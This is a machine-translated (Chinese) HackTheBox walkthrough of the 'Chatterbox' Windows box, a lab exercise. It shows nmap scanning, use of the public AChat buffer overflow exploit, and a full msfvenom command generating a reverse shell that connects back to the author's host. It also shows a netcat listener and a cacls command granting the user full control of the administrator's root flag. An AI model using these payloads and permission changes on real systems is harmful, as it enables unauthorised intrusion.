<html>
<head>
<title>Chatterbox — A Remote Buffer Overflow HackTheBox Walk-through</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Chatterbox —远程缓冲区溢出黑客</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chatterbox-hack-the-box-writeup-dacb2ee8593d?source=collection_archive---------7-----------------------#2018-06-26">https://infosecwriteups.com/chatterbox-hack-the-box-writeup-dacb2ee8593d?source=collection_archive---------7-----------------------#2018-06-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/2240a9e9efc8f05ee1172c76f19eb6c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g4033kAh2twjUJRx1eh2Ag.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">话匣子</figcaption></figure><p id="8451" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">上个月我一直忙于大学毕业和新工作的过渡。我也从VulnHub过渡到了Hackthebox，到目前为止我对它非常满意！不多说了，这里有一篇关于我几周前拥有的一个最近退役的盒子的文章。</p><h1 id="c583" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">摘要</h1><p id="b5d3" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">Chatterbox是运行聊天客户端的Windows机器，容易受到远程缓冲区溢出的攻击。由于权限弱/配置错误，利用此漏洞可以获得主机上的反向外壳并获得用户和根标志。</p><h1 id="610f" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">侦察/扫描</h1><p id="d72d" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">我开始用我的首选nmap扫描来探测服务检测<code class="fe md me mf mg b">-sV</code>和默认脚本<code class="fe md me mf mg b">-sC</code>。然而，这些没有返回任何结果，所以我运行了一个完整的端口扫描。这些扫描可能需要很长时间。因为我没有必要担心启动IDS/IPS设备，所以我运行了一个更主动的扫描来快速返回结果。</p><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="e1a0" class="mp lb iq mg b gy mq mr l ms mt">nmap -sT --min-rate 5000 --max-retries 1 -p-10.10.10.74<!-- --> </span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">nmap -p-</figcaption></figure><p id="cc0e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这返回了一个端口，然后我使用默认脚本对其运行服务扫描。</p><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="a470" class="mp lb iq mg b gy mq mr l ms mt">nmap -sC -sV -p9256 10.10.10.74<!-- --> </span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">nmap -p9256</figcaption></figure><h1 id="89b7" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak"> AChat远程缓冲区溢出</strong></h1><p id="d82f" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">使用<code class="fe md me mf mg b">searchsploit</code>查找服务返回了AChat 0.150 beta7的远程缓冲区溢出漏洞。这是该服务返回的唯一漏洞，所以我非常确定这是路径，因为没有其他服务在TCP上运行。</p><p id="3b10" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这是我第一次完全利用缓冲区溢出，更不用说在远程主机上了。回顾一下<code class="fe md me mf mg b">searchsploit</code> python脚本的代码，有一个shellcode有效负载是用msfvenomto运行<code class="fe md me mf mg b">cmd.exe</code>来执行<code class="fe md me mf mg b">calc.exe</code>生成的，作为利用的概念证明。当您在远程主机上运行它时，它会使服务崩溃并弹出calc！</p><p id="51af" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为了验证这个漏洞，我启动了一个Windows 7虚拟机，下载了一个运行在我的主机上的AChat 0.150 beta7。我将漏洞脚本中的主机IP更改为我的虚拟机，并将其关闭，成功地使服务崩溃并弹出<code class="fe md me mf mg b">calc.exe</code>。太好了！现在我需要从这个漏洞中得到一个反向外壳。</p><h1 id="d3d3" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">反壳</strong></h1><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="39ea" class="mp lb iq mg b gy mq mr l ms mt">msfvenom -a x86 — platform Windows -p windows/shell_reverse_tcp -f python -e x86/unicode_mixed -b ‘\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff’ BufferRegister=EAX LHOST=10.10.14.2 LPORT=1234</span></pre><p id="d404" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">好吧，这是我用过的最长的一句俏皮话之一。让我们来分解一下:</p><blockquote class="mw mx my"><p id="da98" class="kc kd mz ke b kf kg kh ki kj kk kl km na ko kp kq nb ks kt ku nc kw kx ky kz ij bi translated"><code class="fe md me mf mg b">-a</code>x86指定32位架构<br/> <code class="fe md me mf mg b">-platform Windows</code>指定远程主机的平台<br/> <code class="fe md me mf mg b">-p windows/shell_reverse_tcp</code>指定有效负载<br/> <code class="fe md me mf mg b">-f python</code>指定格式化python脚本的输出<br/> <code class="fe md me mf mg b">-e x86/unicode_mixed</code>指定编码器<br/> <code class="fe md me mf mg b">-b</code>指定在编码中要避免的坏字符<br/> <code class="fe md me mf mg b">BufferRegister=EAX</code>指定目标缓冲寄存器<br/> <code class="fe md me mf mg b">LHOST</code>指定要连接回的本地主机IP(我的IP) <br/> <code class="fe md me mf mg b">LPORT</code>指定要连接的本地端口(我的端口)</p></blockquote><p id="33d1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在这个有效载荷中需要强调的一点是<code class="fe md me mf mg b">shell_reverse_tcp</code>是<code class="fe md me mf mg b">reverse_tcp</code>的替代，它不需要meterpreter处理程序。我选择这个是因为我正在准备OSCP考试，并试图使用尽可能少的metasploit。事实上，这个漏洞利用有一个metasploit模块，但是我选择稍微脏一点，用稍微不太自动化的方式打开这个盒子。</p><p id="f907" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">运行<code class="fe md me mf mg b">msfvenom</code>的输出如下所示:</p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">MSF毒液有效载荷</figcaption></figure><p id="cc44" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我可以将其设置为python脚本的有效负载，替换弹出calc.exeand的外壳代码，并在端口1234上设置netcatlistener。</p><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="0cfa" class="mp lb iq mg b gy mq mr l ms mt">nc -lvnp 1234</span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">话匣子反壳</figcaption></figure><p id="4c1e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">从这里开始，获取用户标志就像打印文件内容一样简单:</p><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="61f0" class="mp lb iq mg b gy mq mr l ms mt">type “C:\Users\Alfred\Desktop\user.txt”</span></pre><p id="06c8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">下一步是获取根标志。</p><h1 id="27c4" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">根标志</strong></h1><p id="385e" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">我发现我能够一直导航到管理员的桌面目录，这对于低权限用户来说是不常见的。然而，我无法键入根标志。我想既然我已经被允许进入这个目录，我就可以改变根标志的读取权限。</p><pre class="mh mi mj mk gt ml mg mm mn aw mo bi"><span id="ea24" class="mp lb iq mg b gy mq mr l ms mt">cacls “C:\Users\Administrator\Desktop\root.txt” /E /P Alfred:F</span></pre><blockquote class="mw mx my"><p id="a024" class="kc kd mz ke b kf kg kh ki kj kk kl km na ko kp kq nb ks kt ku nc kw kx ky kz ij bi translated"><code class="fe md me mf mg b">cacls</code> Windows实用程序查看/编辑文件权限<br/> <code class="fe md me mf mg b">/E</code>编辑ACL <br/> <code class="fe md me mf mg b">/P</code>设置权限<br/> <code class="fe md me mf mg b">Alfred:F</code>授予Alfred对文件的完全控制权</p></blockquote><p id="0985" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">果然，我能够授予自己读取该文件的权限，并成功地检索到根标志！</p><p id="3bea" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在得到我需要的东西后，我恢复了这个盒子，因为缓冲区溢出使服务崩溃，我让用户可以读取根标志。</p><h1 id="59f4" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">成交单据</strong></h1><p id="f594" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">总之，这是一个相当快的盒子，我很喜欢它。它让我能够接触到一些我还没有使用过的技术。我绝对推荐Hackthebox，他们的实验室环境和论坛对任何想磨练自己的人来说都是一个极好的资源。</p></div></div>    
</body>
</html>